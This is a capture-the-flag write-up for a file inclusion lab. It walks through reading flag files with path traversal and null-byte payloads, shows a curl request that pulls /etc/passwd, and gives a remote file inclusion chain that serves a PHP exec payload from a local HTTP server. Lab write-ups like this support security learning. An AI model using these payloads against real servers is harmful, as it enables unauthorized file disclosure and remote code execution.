# File Inclusion

A website is provide and they wanted from me to find the flag using the LFI methods

1. Capture Flag1 at /etc/flag1, 
   **HINT**:  This is the hint you’re looking for: Change the form method to POST in the page source or use a tool like Burp to modify the method of the request POST.

So by reading this hint I search for the GET-reader request in the HTML code in order to change it into POST-creator, found it in the code and changed it

![4da3d2eb-ab8a-4669-8263-add17fed301a](file:///C:/Users/user/Pictures/Typedown/4da3d2eb-ab8a-4669-8263-add17fed301a.png)

changed it to post and refreshed the page to enter the `/etc/flag1` and got the flag.



2. Capture Flag2 at /etc/flag2
   
   **HINT** : This is the hint you’re looking for: Change the form method to POST in the page source or use a tool like Burp to modify the method of the request POST.

by changing the cookie for a while I notices that it shows what is written there and I thought of writing the name of the file that I want to read which is the flag by passing the command `../../../../../etc/flag2%00` in the cookies field.



3. Capture Flag3 at /etc/flag3
   
   **HINT**: This is the hint you’re looking for: Change the form method to POST in the page source or use a tool like Burp to modify the method of the request POST.

I used burp suite to change the directory but nothing changing so I moved to command line with the command `curl -X POST http://10.49.129.166/challenges/chall3.php -d 'method=POST&file=../../../../etc/passwd%00' --output -` and it worked by giving me the output for the passwords file

so next I changed the "passwd" file with the "flag3" and got the flag

4. Gain RCE in **Lab #Playground** /playground.php with RFI to execute the hostname command. What is the output?

using the same command `../../../../etc/hostname` to read the file using the LFI

now I need to read it in RFI

1. Make a http server need for the listening from the remote server using `python -m http.server <port>`

2. write the command in a file (payload)

```php
<?php echo exec("hostname");?>
```

3. write the `http://<local_ip:port>/payload_file` on the website to apply the RFI RCE
